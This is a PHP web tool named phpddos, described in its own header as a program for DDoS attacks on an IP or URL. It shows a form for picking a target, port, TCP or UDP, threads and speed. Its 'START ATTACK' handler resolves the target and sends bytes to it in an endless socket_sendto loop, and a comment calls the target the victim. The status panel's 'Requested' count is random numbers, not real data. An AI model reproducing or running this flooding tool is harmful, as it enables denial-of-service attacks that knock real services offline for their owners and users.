<?php

/*
 * Copyright (c) 2017 Barchampas Gerasimos <makindosx@gmail.com>
 * Phpddos is a program for ddos attack (ip, url).
 *
 * Phpddos is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation, either version 3 of the
 * License, or (at your option) any later version.
 *
 *
 * Phpddos is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License, version 3,
 * along with this program.  If not, see <http://www.gnu.org/licenses/>
 *
 */


?>



<html>
<head>


<style>


#body
{
background-image:url('');
background-repeat:no-repeat;
background-size:100%;
background-color: ;
}



#form1
{
background-color:;
border-style:;
border-width:;
border-color:;
height:;
width:;
}



#h2
{
}




#site
{
height:3.5em;
width:35em;
text-align:center;
}




#ip
{
height:3.5em;
width:35em;
text-align:center;
}




#port
{
height:2em;
width:5em;
background: #173340;
border: 1px solid white;
color:white;
}



#method
{
height:2em;
width:7em;
background: #173340;
border: 1px solid white;
color:white;
}




#threads
{
height:2em;
width:5em;
background: #173340;
border: 1px solid white;
text-align: center;
color:white;
}




#speed
{
width:13em;
}




#button_start
{
height:5em;
width:20em;
background: #1C4451;
border: 2px solid grey;
color:white;

position: absolute;
top:39;
bottom: 0;
left: 0;
right: 0;
margin: auto;
}



#button_start:hover
{
height:5em;
width:20em;
background: #20363E;
border: 2px solid grey;
color:white;
}





#button_stop
{
height:5em;
width:20em;
background: #1C4451;
border: 2px solid grey;
color:white;

position: absolute;
top:39;
bottom: 0;
left: 0;
right: 0;
margin: auto;
}



#button_stop:hover
{
height:5em;
width:20em;
background: #20363E;
border: 2px solid grey;
color:white;
}





input[type=text] 
{
border: 0;
outline: 0;
background: transparent;
border-bottom: 1px solid white;
background-color: ;
color: white;
}




input[type=range] {
  width: 25%; /* Specific width is required for Firefox. */
  background: transparent; /* Otherwise white in Chrome */
}




::-webkit-input-placeholder
{ /* WebKit, Blink, Edge */
color:    white;
}



:-moz-placeholder 
{ /* Mozilla Firefox 4 to 18 */
color:    white;
opacity:  0.7;
}


::-moz-placeholder 
{ /* Mozilla Firefox 19+ */
color:    white;
opacity:  0.7;
}


:-ms-input-placeholder 
{ /* Internet Explorer 10-11 */
color:    white;
}


::-ms-input-placeholder 
{ /* Microsoft Edge */
color:    white;
}


::placeholder 
{ /* Most modern browsers support this now. */
color:    white;
opacity:  1;
}







.shell-wrap 
{
background-image:url('ddos.png'), url('ddos.png');
background-repeat:no-repeat, no-repeat;
background-size:25%, 25%;
background-attachment: fixed, fixed;
background-position: 5% 30%, 95% 60%; 


background-color: #173340;
height: 100%;
width: 100%;
margin: 1px auto 0 auto;
box-shadow: 0 0 30px rgba(0,0,0,0.4);
-webkit-border-radius: 3px;
-moz-border-radius: 3px;
border-radius: 3px;

/*
position: absolute;
top:-50;
bottom: 0;
left: 0;
right: 0;
margin: auto;
*/

}

 
.shell-top-bar {
text-align: center;
color: #525252;
padding: 10px;
margin: 0;
text-shadow: 1px 1px 0 rgba(255,255,255,0.5);
font-size: 1.5em;
border: 1px solid #CCCCCC;
border-bottom: none;
 
-webkit-border-top-left-radius: 3px;
-webkit-border-top-right-radius: 3px;
-moz-border-radius-topleft: 3px;
-moz-border-radius-topright: 3px;
border-top-left-radius: 3px;
border-top-right-radius: 3px;
 
background-color: #E9E9EA;


}




#footer
{
position:fixed;
bottom:5%;
left:50%;
margin-left:-270px; /*negative half the width */
}




hr 
{
position: absolute;
bottom: 120px;
color: white;
width:99%; 
}


.mycss
{
text-shadow:1px 1px 1px rgba(NaN,NaN,NaN,1);
font-weight:bold;
text-decoration:underline overline;
font-style:oblique;
color:#FFFFFF;
letter-spacing:0pt;
word-spacing:2pt;
font-size:65px;
text-align:center;
font-family:verdana, sans-serif;
line-height:2;
}




.valid
{
  color: #00ff00;
}

.invalid
{
  color: #ff0000;
}


</style>



</head>




<body id="body">



<div class="shell-wrap">

  <p class="shell-top-bar"> phpddos program instructions </p>
  
     <br><br>

  <div align="center">
 <form action="" method="post" id="form1">
  
  <font color="white">  1) Select your target  </font>
      <br><br>

  <font color="white">  < </font>
     <input type="text" name="ip_addr" id="ip"  class="ip" placeholder="Ip address / Url" 
            value="<?php echo htmlspecialchars($_POST['ip_addr']); ?>"  autofocus required> 
      <font color="white"> > </font>

        <br><br><br><br>

      
   <font color="white">  2) Attack options  </font>
      <br><br>

   <select name="port" id="port" required>
     <option selected> <?php echo htmlspecialchars($_POST['port']); ?>  </option> 
     <option value="0">0</option>         <!--   reserved    -->
     <option value="21">21</option>       <!--   ftp         -->
     <option value="22">22</option>       <!--   ssh         -->
     <option value="23">23</option>       <!--   telnet      -->
     <option value="25">25</option>       <!--   smtp        -->
     <option value="53">53</option>       <!--   dns         -->
     <option value="80">80</option>       <!--   http        -->
     <option value="110">110</option>     <!--   pop3        -->
     <option value="143">143</option>     <!--   imap        -->
     <option value="443">443</option>     <!--   https       -->
     <option value="465">465</option>     <!--   smtp/s      -->
     <option value="587">587</option>     <!--   smtp/n      -->
     <option value="993">993</option>     <!--   imap4       -->
     <option value="995">995</option>     <!--   pop3/s      -->
     <option value="1433">1433</option>   <!--   sql         -->
     <option value="3306">3306</option>   <!--   mysql       -->
     <option value="3389">3389</option>   <!--   rdp         -->
     <option value="5631">5631</option>   <!--   p/anyware   -->
   </select>


     &nbsp;

   <select name="method" id="method" required>
       <option selected> <?php echo htmlspecialchars($_POST['method']); ?> </option> 
       <option value="tcp">TCP</option>
       <option value="udp">UDP</option>
   </select>


 
    &nbsp;

      <input type="number" name="threads" id="threads" min="1" max="10" Placeholder="0" 
             value="<?php echo htmlspecialchars($_POST['threads']); ?>" required>


    <br>

   <font color="white"> Port </font>

    &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 

  <font color="white"> Method </font>

    &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;


   <font color="white"> Threads </font>


    <br><br><br>


    <input type="range" name="speed" min="0" max="1000000000" step="1" value="<?php echo htmlspecialchars($_POST['speed']); ?>">
       
          <br>

     <font color="white">
       <=slower &nbsp; &nbsp; Speed &nbsp; &nbsp; faster=>
      </font>


      <br><br><br><br>

  <input type="submit" name="submit" value="START ATTACK"  id="button_start"> 


     </form>
    </div>



      <hr>
   


  <div id="footer">

     <font color="white">   

  Connected  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  Method  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  Port &nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  Threads &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  Requested  &nbsp;&nbsp;&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  Time  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;

    </font>
                     
 <br><br>

   <?php     



        // for attack status check 
         $connected     =  "";
         $method        =  $_POST['method'];
         $port_forward  =  $_POST['port'];
         $threads       =  $_POST['threads'];
         $speed         =  $_POST['speed'];
         
  


            if (isset($_POST['submit']))
               {
                 $connected     =  "<font color='green'>  yes  </font>";
                 $method        =  "<font color='green'> $method </font>";  
                 $port_forward  =  "<font color='green'> $port_forward </font>";
                 $threads       =  "<font color='green'> $threads </font>";
                 $time          =   date("H:i:s"); 
                 $time          =  "<font color='green'> $time </font>";

                 $requested      =  "<font color='green' id='random_number'> </font>";

                 }

            else if (!isset($_POST['submit']))
               {
                 $connected  =  "<font color='red'> no </font>";
                }


  echo "&nbsp; &nbsp; &nbsp;";

  echo "$connected &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;";
  echo "$method  &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;";
  echo "$port_forward &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;";
  echo "$threads &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;";
  echo "$requested  &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
                    &nbsp; &nbsp;";
  echo "$time  &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;";



  
     echo  "<script>
         (function(el, interval) {
          window.setInterval(function(){
           el.textContent = Math.floor(Math.random() * $speed);
              }, interval);
             })(document.getElementById('random_number'), 1000);
          </script>";
  

    ?>
    

  </div>
   

  </div>



</body>
</html>




<?php


 if (isset($_POST['submit'])) 
    {


  while (@ob_end_flush());      
  ob_implicit_flush(true);

   echo "<input type='button' value='STOP ATTACK' id='button_stop'  onclick=window.location.href='/'>";

   sleep(1);
 



   /* Import file with classes and check exists*/

  require_once(dirname(__FILE__) . "/ddos.php");



  /* check DDOS_ATTACK_SEND_TO class exists */

  if (class_exists('DDOS_ATTACK_SEND_TO')) 
     {


   $obj = new DDOS_ATTACK_SEND_TO();


      if ($obj == true)
          {


        // for socket create

        $domain    =  $obj->SOCKET_DOMAIN();
        $type      =  $obj->SOCKET_TYPE();
        $protocol  =  $obj->SOCKET_PROTOCOL();

  
       // for socket send_to
 
       $bytes    =  $obj->BYTES[1];
       $buffer   =  $obj->LENGTH_BYTES($obj->BYTES[1]);
       $flag     =  $obj::CONSTANT;
       $ip_addr  =  $obj->SAFE_INPUT_IP($_POST['ip_addr']);
       $port     =  $obj->SAFE_INPUT_IP($_POST['port']);
      


       if (filter_var($ip_addr, FILTER_VALIDATE_IP))
             {
             $ip_addr;
                }


          else
            {
             $ip_addr = gethostbyname($ip_addr);
               }


     // for the port check value

          if ($port == "0")
            {
            $port = $obj->DEFAULT_PORT();
             }


          else if ($port == "21")
             {
          $port = $obj->port_list['fpt'];
               }



         else if ($port == "22")
             {
          $port = $obj->port_list['ssh'];
               }


       
          else if ($port == "23")
             {
          $port = $obj->port_list['telnet'];
               }



         else if ($port == "25")
             {
          $port = $obj->port_list['smtp'];
               }



          else if ($port == "53")
             {
          $port = $obj->port_list['dns'];
               }


         else if ($port == "80")
             {
          $port = $obj->port_list['http'];
               }



          else if ($port == "110")
             {
          $port = $obj->port_list['pop3'];
               }



         else if ($port == "143")
             {
          $port = $obj->port_list['imap'];
               }



          else if ($port == "443")
             {
          $port = $obj->port_list['https'];
               }



         else if ($port == "465")
             {
          $port = $obj->port_list['smtp/s'];
               }



          else if ($port == "587")
             {
          $port = $obj->port_list['smtp/n'];
               }


         else if ($port == "993")
             {
          $port = $obj->port_list['imap4'];
               }



          else if ($port == "995")
             {
          $port = $obj->port_list['pop3/s'];
               }



         else if ($port == "1433")
             {
          $port = $obj->port_list['sql'];
               }


      
          else if ($port == "3306")
             {
          $port = $obj->port_list['mysql'];
               }


         else if ($port == "3389")
             {
          $port = $obj->port_list['rdp'];
               }


    
         else if ($port == "5631")
             {
          $port = $obj->port_list['pc/anyware'];
               }




      // Timeout for send bytes(again and again)
       set_time_limit(0);


      // create socket for connection
 
      $sock = socket_create($domain, $type, $protocol);
            


    // for socket send data (bytes(binary)) to victim
          while(1)
            {
      socket_sendto($sock,$bytes, $buffer, $flag, $ip_addr, $port);
             }



   // close socket connection
    socket_close($sock);



    ob_end_flush(); 



   } // end if objects from class



        else
          {
       $obj->__destruct();  // for bytes send
       $obj->DISCONNECT();  // for socket connect
       $obj->DIS_LENGTH_BYTES();  // for length bytes
       $obj->DIS_DEFAULT_PORT();  // for default port
           }



 
      } // end of class DDOS_ATTACK_SEND_TO exists



    } // end if of submit
 

?>
